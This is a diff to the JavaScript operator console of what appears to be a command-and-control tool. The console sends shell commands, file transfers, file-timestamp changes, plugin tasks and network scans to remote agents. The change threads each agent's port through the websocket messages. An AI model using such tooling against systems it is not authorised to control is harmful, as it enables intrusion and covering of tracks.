@@ -301,6 +301,16 @@ function normalizeAgentRecord(item, fallbackUid = "") {
     return normalized;
 }
 
+function getPortByUid(uid) {
+    const user = User_data.find(item =>
+        String(item.uid) === String(uid)
+    );
+    const protocolValue = String(user?.protocol || "").trim();
+    const portMatch = protocolValue.match(/:(\d+)\s*$/);
+    const port = portMatch ? portMatch[1] : "";
+    return port;
+}
+
 function getAgentUid(item) {
     return String(
         item && (item.uid !== undefined ? item.uid :
@@ -523,8 +533,10 @@ function buildPluginButtonsHtml(view) {
 
     if (pluginParam && typeof pluginParam === "object") {
         pluginGroup = pluginParam[view.os] || null;
+
         if (!pluginGroup) {
             const targetOs = String(view.os || "").toLowerCase();
+
             for (const osKey in pluginParam) {
                 if (String(osKey || "").toLowerCase() === targetOs) {
                     pluginGroup = pluginParam[osKey];
@@ -537,12 +549,15 @@ function buildPluginButtonsHtml(view) {
     if (pluginGroup && typeof pluginGroup === "object") {
         for (let codeword in pluginGroup) {
             let paramDescList = pluginGroup[codeword];
+
             let encodedDesc = encodeURIComponent(
                 (Array.isArray(paramDescList) ? paramDescList : []).join(",")
             );
+
             let safeCodewordHtml = escapeHtml(codeword);
             let safeCodewordJs = escapeInlineJsArg(codeword);
             let safeEncodedDescJs = escapeInlineJsArg(encodedDesc);
+
             pluginButtons +=
                 '<button type="button" class="console-link" onclick="showPluginDialog(\'' +
                 view.safeUidJs +
@@ -552,7 +567,9 @@ function buildPluginButtonsHtml(view) {
                 safeEncodedDescJs +
                 '\', \'' +
                 safeCodewordJs +
-                '\')">[' + safeCodewordHtml + ']</button>';
+                '\')">[' +
+                safeCodewordHtml +
+                ']</button>';
         }
     }
 
@@ -3006,14 +3023,18 @@ class index{
             delete this.pendingTaskInputs[key];
             this.stopGetResults(msg.uid, taskid);
             this.appendOutput(msg.data);
+
+            const port = getPortByUid(msg.uid);
+            const safePortJs = escapeInlineJsArg(port);
+
             if (taskInput && taskInput.isConnected) {
                 this.removeInputNode(taskInput);
-                this.createInput();
+                this.createInput(safePortJs);
             } else if (!this.currentInput || !this.currentInput.isConnected) {
-                this.createInput();
+                this.createInput(safePortJs);
             }
         }
-        async get(command){
+        async get(command,port){
             if(!this.uid){
                 return;
             }
@@ -3029,7 +3050,8 @@ class index{
                     {
                         uid:this.uid,
                         msg:command,
-                        taskid:taskid
+                        taskid:taskid,
+                        port :port,
                     }
                 );
                 if(result){
@@ -3050,7 +3072,7 @@ class index{
                 if (this.currentInput && this.currentInput.isConnected) {
                     this.currentInput.focus();
                 } else {
-                    this.createInput();
+                    this.createInput(port);
                 }
             }
         }
@@ -3068,7 +3090,7 @@ class index{
             inputContainer.appendChild(newPrompt);
             terminal.scrollTop = terminal.scrollHeight;
         }
-        createInput() {
+        createInput(port) {
             if (
                 this.currentInput &&
                 this.currentInput.isConnected
@@ -3076,31 +3098,36 @@ class index{
                 this.currentInput.focus();
                 return;
             }
-            const newPrompt = document.createElement('div');
-            newPrompt.className = 'output';
-            newPrompt.textContent = 'Command>';
-            const newInput = document.createElement('input');
-            newInput.type = 'text';
-            newInput.className = 'shell-input';
-            newInput.addEventListener('keydown', this.inputKeydown);
+            const newPrompt = document.createElement("div");
+            newPrompt.className = "output";
+            newPrompt.textContent = "Command>";
+        
+            const newInput = document.createElement("input");
+            newInput.type = "text";
+            newInput.className = "shell-input";
+            // 通过闭包传递 port
+            newInput.addEventListener("keydown", (event) => {
+                this.inputKeydown(event, port);
+            });
             this.inputContainer.appendChild(newPrompt);
             this.inputContainer.appendChild(newInput);
+        
             newInput.focus();
             this.currentInput = newInput;
         }
-        async inputKeydown(event) {
-            if (event.key === 'Enter') {
-                event.preventDefault();
-                const inputEl = event.target;
-                if (!inputEl) {
-                    return;
-                }
-                this.currentInput = inputEl;
-                const command = inputEl.value.trim();
-                if (command) {
-                    await this.get(command);
-                    // ?????? await lain_time ?? createInput???????? get ?????
-                }
+        async inputKeydown(event, port) {
+            if (event.key !== "Enter") {
+                return;
+            }
+            event.preventDefault();
+            const inputEl = event.target;
+            if (!inputEl) {
+                return;
+            }
+            this.currentInput = inputEl;
+            const command = inputEl.value.trim();
+            if (command) {
+                await this.get(command, port);
             }
         }
         async loadFile(file_name, fileSize){
@@ -3113,13 +3140,18 @@ class index{
                 : 0;
             let file_key = this.uid + "**///**" + file_name + "**///**" + splitSize;
             let powershell = "LOAD_U_FILE*//*" + file_key;
+
+            const port = getPortByUid(this.uid);
+            const safePortJs = escapeInlineJsArg(port);
+
             webSocketClient.send(
                 
                 "msg",
                 {
                     uid:this.uid,
                     msg:powershell,
-                    taskid:AgentTaskId
+                    taskid:AgentTaskId,
+                    port: safePortJs
                 }
             );
             return true;
@@ -3133,13 +3165,18 @@ class index{
                 ? parseFloat(splitSizeInput.value) * 1024 * 1024
                 : 0;
             let powershell = "GET_U_FILE*//*" + path + "*//*" + splitSize;
+
+            const port = getPortByUid(this.uid);
+            const safePortJs = escapeInlineJsArg(port);
+
             webSocketClient.send(
                 
                 "msg",
                 {
                     uid:this.uid,
                     msg:powershell,
-                    taskid:AgentTaskId
+                    taskid:AgentTaskId,
+                    port: safePortJs
                 }
             );
         }
@@ -3294,10 +3331,15 @@ class index{
                     const dirPath = lastSlash >= 0 ? oldPath.substring(0, lastSlash) : '';
                     const newPath = dirPath ? (dirPath + '/' + newName) : newName;
                     const cmd = "CHANG_FILE_NAME*//*" + oldPath + "*//*" + newName;
+
+                    const port = getPortByUid(this.uid);
+                    const safePortJs = escapeInlineJsArg(port);
+
                     webSocketClient.send("msg", {
                         uid: this.uid,
                         msg: cmd,
-                        taskid: AgentTaskId
+                        taskid: AgentTaskId,
+                        port: safePortJs
                     });
                     filenameSpan.innerText = newName;
                     new_file.dataset.path = newPath;
@@ -3311,10 +3353,15 @@ class index{
                     if (!newTime) return;
 
                     const cmd = "CHANG_FILE_TIME*//*" + currentPath + "*//*" + newTime;
+                    
+                    const port = getPortByUid(this.uid);
+                    const safePortJs = escapeInlineJsArg(port);
+                    
                     webSocketClient.send("msg", {
                         uid: this.uid,
                         msg: cmd,
-                        taskid: AgentTaskId
+                        taskid: AgentTaskId,
+                        port: safePortJs
                     });
 
                     new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
@@ -3519,10 +3566,13 @@ class index{
             };
 
             try {
+                const port = getPortByUid(this.uid);
+                const safePortJs = escapeInlineJsArg(port);
                 const sent = await webSocketClient.send("msg", {
                     uid: this.uid,
                     msg: powershell,
-                    taskid: taskId
+                    taskid: taskId,
+                    port: safePortJs
                 });
 
                 if (!sent) {
@@ -3590,12 +3640,15 @@ class index{
         }
         switchVer(value){
             let cmd = "SWITCH_VERSION*//*"+value;
+            const port = getPortByUid(this.uid);
+            const safePortJs = escapeInlineJsArg(port);
             webSocketClient.send(
                 "msg",
                 {
                     uid:this.uid,
                     msg:cmd,
-                    taskid:AgentTaskId
+                    taskid:AgentTaskId,
+                    port:safePortJs
                 }
             );
         }
@@ -3688,7 +3741,9 @@ class index{
                             safeEncodedDescJs +
                             '\', \'' +
                             safeCodewordJs +
-                            '\')">[' + safeCodewordHtml + ']</button>';
+                            '\')">[' +
+                            safeCodewordHtml +
+                            ']</button>';
                     }
                 }
 
@@ -3937,7 +3992,11 @@ class index{
 		
 		    window.terminalSessions[uid] = terminal;
 		    window.activeTerminal = terminal;
-		    terminal.createInput();
+
+            const port = getPortByUid(uid);
+            const safePortJs = escapeInlineJsArg(port);
+
+		    terminal.createInput(safePortJs);
 		
 		    dialog._terminalFocusHandler = function () {
 		        if (dialog._terminalClosed) {
@@ -5136,6 +5195,10 @@ class index{
             const delay = document.getElementById('delay_' + uid).value;
             const jitter = document.getElementById('jitter_' + uid).value;
             const username = document.getElementById('username_' + uid).value;
+
+            const port = getPortByUid(uid);
+            const safePortJs = escapeInlineJsArg(port);
+
             try{
                 let result = await webSocketClient.send(
                     "change",
@@ -5145,7 +5208,8 @@ class index{
                         jitter: jitter,
                         username: username,
                         uid: uid,
-                        taskid: AgentTaskId
+                        taskid: AgentTaskId,
+                        port: safePortJs
                     }
                 );
             }catch(err){
@@ -5689,12 +5753,17 @@ class lain_net{
             customLog("Please select scan type");
             return false;
         }
+
+        const port = getPortByUid(uid);
+        const safePortJs = escapeInlineJsArg(port);
+
         const sent = await webSocketClient.send(
             "msg",
             {
                 uid:uid,
                 msg:cmd,
-                taskid:AgentTaskId
+                taskid:AgentTaskId,
+                port:safePortJs
             }
         );
         if (!sent) {
@@ -7503,6 +7572,12 @@ function showPluginDialog(uid, os, paramDescList, codeword) {
             }
             msgParts.push(value);
         }
+        const port = getPortByUid(uid);
+        if (!port) {
+            customAlert("Agent port not found.");
+            return;
+        }
+
         let msg = codeword + '*//*' + msgParts.join('*//*');
         try {
             const taskid = createRuntimeTaskId("plugin");
@@ -7511,7 +7586,8 @@ function showPluginDialog(uid, os, paramDescList, codeword) {
                 {
                     uid: uid,
                     msg: msg,
-                    taskid: taskid
+                    taskid: taskid,
+                    port: port
                 }
             );
             if (!result) {
